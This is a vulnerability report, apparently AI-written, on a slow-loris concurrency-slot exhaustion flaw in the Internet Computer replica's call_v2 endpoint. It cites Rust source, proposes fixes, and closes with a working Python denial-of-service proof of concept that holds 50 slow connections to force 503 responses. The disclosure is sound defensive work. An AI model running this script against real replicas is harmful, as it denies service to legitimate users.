Based on my investigation of the actual code, here is my assessment:

---

### Title
Slow-Loris Body Exhaustion of `call_v2` Concurrency Slots via `WithTimeout` Held During Body Read — (`rs/http_endpoints/public/src/common.rs`, `rs/http_endpoints/public/src/lib.rs`)

### Summary

The `call_v2` endpoint acquires its `GlobalConcurrencyLimitLayer` permit **before** the request body is read. Because body reading occurs inside the axum extractor `WithTimeout<Cbor<...>>` — which runs as part of the handler after the concurrency slot is already held — an attacker can hold all 50 slots for up to 300 seconds by streaming a valid body slowly, causing every subsequent request to receive `503 Service Unavailable`.

### Finding Description

**Concurrency slot acquired before body read.**

The service stack for `call_v2` is built as:

```
HandleErrorLayer → load_shed → GlobalConcurrencyLimitLayer(50) → axum handler
``` [1](#0-0) 

The concurrency permit is acquired by `GlobalConcurrencyLimitLayer` when the request enters the tower service — before the axum handler runs. The handler's extractor `WithTimeout<Cbor<HttpRequestEnvelope<HttpCallContent>>>` then reads and deserializes the body **while holding the permit**: [2](#0-1) 

`WithTimeout` wraps the inner extractor with a `tokio::time::timeout` of `MAX_REQUEST_RECEIVE_TIMEOUT`: [3](#0-2) 

`MAX_REQUEST_RECEIVE_TIMEOUT` is **300 seconds**: [4](#0-3) 

The default concurrency limit for `call_v2` is **50**: [5](#0-4) 

**Attack path:** An attacker opens 50 TCP connections (or 50 HTTP/2 streams on fewer connections, since `http_max_concurrent_streams` defaults to 1000) and on each streams a valid 5 MB CBOR body at ≈17 KB/s. Each connection holds its concurrency slot for the full 300 s window. The 51st request hits `load_shed` and receives `503`. [6](#0-5) 

**No timeout layer exists in the `call_v2` service builder** — the only protection is the per-extractor `WithTimeout`, which runs inside the handler after the slot is already consumed. [7](#0-6) 

### Impact Explanation

All 50 `call_v2` handler slots are occupied for up to 300 s. Legitimate callers receive `503` for the entire window. `call_v3` and `call_v4` have **no explicit concurrency limit** (see the `TODO` at lib.rs:606), so only `call_v2` is affected by this specific vector. [8](#0-7) 

### Likelihood Explanation

The attack requires only 50 long-lived connections — not volumetric traffic. A single attacker with one machine and multiple source ports (or a single HTTP/2 connection with 50 streams) can sustain it indefinitely by cycling connections before the 300 s timeout expires. No authentication, canister ownership, or privileged role is required. The replica's HTTP port (default 8080) is the entry point.

**Mitigating factor in production:** IC replicas are deployed behind boundary nodes that enforce per-IP connection and rate limits. If boundary node protections are correctly tuned, they reduce practical exploitability. However, the replica code itself has no defense against this pattern, and any deployment where the replica port is reachable directly (e.g., subnet-internal tooling, misconfigured firewall, or a compromised boundary node) is fully exposed.

### Recommendation

1. Move body reading **outside** the concurrency-limited scope: accept the connection, read and buffer the body under a separate (or no) concurrency limit, then acquire the handler slot only for actual processing.
2. Alternatively, apply a tower `TimeoutLayer` **before** `GlobalConcurrencyLimitLayer` so that slow-body connections are evicted before consuming a slot for the full 300 s.
3. Add per-IP or per-connection slot accounting so a single source cannot monopolize all 50 permits.
4. Consider reducing `MAX_REQUEST_RECEIVE_TIMEOUT` or making it configurable independently of the processing timeout.

### Proof of Concept

```python
import socket, threading, time

TARGET = ("replica-host", 8080)
BODY_SIZE = 5 * 1024 * 1024  # 5 MB
RATE = 17 * 1024              # 17 KB/s → ~300 s to deliver
SLOTS = 50

def slow_loris():
    s = socket.create_connection(TARGET)
    # Send HTTP/1.1 POST headers
    s.sendall(
        b"POST /api/v2/canister/aaaaa-aa/call HTTP/1.1\r\n"
        b"Host: replica-host\r\n"
        b"Content-Type: application/cbor\r\n"
        f"Content-Length: {BODY_SIZE}\r\n\r\n".encode()
    )
    sent = 0
    while sent < BODY_SIZE:
        chunk = b"\x00" * min(1024, BODY_SIZE - sent)
        s.sendall(chunk)
        sent += len(chunk)
        time.sleep(1024 / RATE)

threads = [threading.Thread(target=slow_loris) for _ in range(SLOTS)]
for t in threads: t.start()

time.sleep(5)  # let slots fill

# 51st request should receive 503
import urllib.request
try:
    urllib.request.urlopen(
        urllib.request.Request(
            "http://replica-host:8080/api/v2/canister/aaaaa-aa/call",
            data=b"\xa0",
            headers={"Content-Type": "application/cbor"},
            method="POST",
        )
    )
except urllib.error.HTTPError as e:
    assert e.code == 503, f"Expected 503, got {e.code}"
    print("CONFIRMED: 503 received — all slots exhausted")
```

### Citations

**File:** rs/http_endpoints/public/src/lib.rs (L591-605)
```rust
    let service_builder = |concurrency_limit_layer: GlobalConcurrencyLimitLayer| {
        ServiceBuilder::new()
            .layer(HandleErrorLayer::new(map_box_error_to_response))
            .load_shed()
            .layer(concurrency_limit_layer)
    };

    let final_router =
        base_router
            .merge(http_handler.status_router.layer(service_builder(
                GlobalConcurrencyLimitLayer::new(config.max_status_concurrent_requests),
            )))
            .merge(http_handler.call_v2_router.layer(service_builder(
                GlobalConcurrencyLimitLayer::new(config.max_call_concurrent_requests),
            )))
```

**File:** rs/http_endpoints/public/src/lib.rs (L606-608)
```rust
            // TODO(CON-1574): see if there is any reasonable explicit concurrency limit we could use here.
            .merge(http_handler.call_v3_router)
            .merge(http_handler.call_v4_router)
```

**File:** rs/http_endpoints/public/src/call/call_async.rs (L103-111)
```rust
async fn handler(
    Path(effective_canister_id): Path<CanisterId>,
    State(AsynchronousCallHandlerState {
        ingress_tracking_semaphore,
        ingress_validator,
        ingress_watcher_handle,
    }): State<AsynchronousCallHandlerState>,
    WithTimeout(Cbor(request)): WithTimeout<Cbor<HttpRequestEnvelope<HttpCallContent>>>,
) -> AsyncResponse {
```

**File:** rs/http_endpoints/public/src/common.rs (L44-45)
```rust
/// [`408 Request Timeout`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/408) will be returned to the user.
const MAX_REQUEST_RECEIVE_TIMEOUT: Duration = Duration::from_secs(300);
```

**File:** rs/http_endpoints/public/src/common.rs (L195-208)
```rust
    async fn from_request(req: axum::extract::Request, s: &S) -> Result<Self, Self::Rejection> {
        match timeout(MAX_REQUEST_RECEIVE_TIMEOUT, E::from_request(req, s)).await {
            Ok(Ok(bytes)) => Ok(WithTimeout(bytes)),
            Ok(Err(err)) => Err(err.into_response()),
            Err(_) => Err((
                StatusCode::REQUEST_TIMEOUT,
                format!(
                    "receiving request took longer than {}s",
                    MAX_REQUEST_RECEIVE_TIMEOUT.as_secs()
                ),
            )
                .into_response()),
        }
    }
```

**File:** rs/config/src/http_handler.rs (L76-86)
```rust
            connection_read_timeout_seconds: 1_200, // 20 min
            request_timeout_seconds: 300,           // 5 min
            http_max_concurrent_streams: 1000,
            max_request_size_bytes: 5 * 1024 * 1024, // 5MB
            max_delegation_certificate_size_bytes: 1024 * 1024, // 1MB
            max_read_state_concurrent_requests: 100,
            max_catch_up_package_concurrent_requests: 100,
            max_dashboard_concurrent_requests: 100,
            max_status_concurrent_requests: 100,
            max_call_concurrent_requests: 50,
            max_query_concurrent_requests: QUERY_EXECUTION_THREADS_TOTAL * 100,
```
